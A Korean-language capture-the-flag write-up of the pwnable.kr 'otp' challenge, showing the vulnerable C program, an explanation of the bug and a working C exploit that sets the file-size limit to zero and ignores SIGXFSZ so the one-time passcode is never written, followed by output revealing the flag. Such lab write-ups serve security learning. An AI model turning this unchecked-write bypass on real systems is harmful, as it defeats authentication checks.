# [pwnable.kr] otp writeup

#### [summary] signal(SIGXFSZ), setrlimit, sigignore ...

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

int main(int argc, char* argv[]){
	char fname[128];
	unsigned long long otp[2];

	if(argc!=2){
		printf("usage : ./otp [passcode]\n");
		return 0;
	}

	int fd = open("/dev/urandom", O_RDONLY);
	if(fd==-1) exit(-1);

	if(read(fd, otp, 16)!=16) exit(-1);
	close(fd);

	sprintf(fname, "/tmp/%llu", otp[0]);
	FILE* fp = fopen(fname, "w");
	if(fp==NULL){ exit(-1); }
	fwrite(&otp[1], 8, 1, fp);
	fclose(fp);

	printf("OTP generated.\n");

	unsigned long long passcode=0;
	FILE* fp2 = fopen(fname, "r");
	if(fp2==NULL){ exit(-1); }
	fread(&passcode, 8, 1, fp2);
	fclose(fp2);
	
	if(strtoul(argv[1], 0, 16) == passcode){
		printf("Congratz!\n");
		system("/bin/cat flag");
	}
	else{
		printf("OTP mismatch\n");
	}

	unlink(fname);
	return 0;
}
```

넘오나도 신박했던 문제.

ulimit을 이용해서 파일 사이즈에 제한을 걸어 `fwrite(&otp[1], 8, 1, fp)`를 실행을 할 수 없도록 하여 passcode의 content가 NULL이 되도록 하는 문제임.

다만 위와 같이 파일 사이즈에 제한을 건다면 파일 크기 제한 초과라는 의미의 __SIGXFSZ__ 시그널이 보내지게 되며 프로세스가 종료하게 되는데, 이 시그널의 handler를 변경하거나 그냥 해당 시그널을 무시하도록 프로그램을 짜면 된다.

### exploit

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/resource.h>


int main(int argc, char* argv[]){
	struct rlimit rlim;
	rlim.rlim_cur = 0;
	rlim.rlim_max = 0;
	setrlimit(RLIMIT_FSIZE, &rlim);

	sigignore(SIGXFSZ);

	char* home = "/home/otp";	
	chdir(home);
	char* arg[] = {"~/otp", "\x00", NULL};
	char* env[] = {NULL};
	execve(argv[1], arg, env);    

	return 0;
}
```

### result

```shell
otp@prowl:/tmp/charlie$ ./otp2 ~/otp
OTP generated.
Congratz!
Darn... I always forget to check the return value of fclose() :(
```



> ref
>
> https://12bme.tistory.com/224
> https://www.joinc.co.kr/w/Site/system_programing/Book_LSP/ch06_Signal
> https://duksoo.tistory.com/entry/Linux-setrlimit-getrlimit

